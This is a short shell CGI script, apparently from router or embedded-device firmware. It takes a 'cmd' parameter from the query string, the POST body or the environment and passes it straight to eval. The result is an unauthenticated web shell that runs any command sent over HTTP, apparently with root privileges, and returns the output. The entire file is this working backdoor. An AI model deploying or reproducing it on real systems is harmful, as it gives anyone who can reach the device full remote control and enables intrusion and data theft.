#!/bin/sh
export PATH="/bin:/sbin:/usr/bin:/usr/sbin:/root/mtlk/scripts"
printf "Content-Type: text/plain\r\n\r\n"

if [ -n "$cmd" ]; then
    CMD="$cmd"
elif [ -n "$QUERY_STRING" ]; then
    CMD=$(echo "$QUERY_STRING" | sed -n 's/^.*cmd=\([^&]*\).*$/\1/p')
    CMD=$(echo "$CMD" | sed -e 's/+/ /g' -e 's/%20/ /g')
fi

if [ -z "$CMD" ] && [ -n "$CONTENT_LENGTH" ] && [ "$CONTENT_LENGTH" -gt 0 ]; then
    read -n "$CONTENT_LENGTH" POST_DATA 2>/dev/null
    CMD=$(echo "$POST_DATA" | sed -n 's/^.*cmd=\([^&]*\).*$/\1/p')
    CMD=$(echo "$CMD" | sed -e 's/+/ /g' -e 's/%20/ /g')
fi

[ -z "$CMD" ] && CMD="cat /proc/uptime"
eval "$CMD" 2>&1
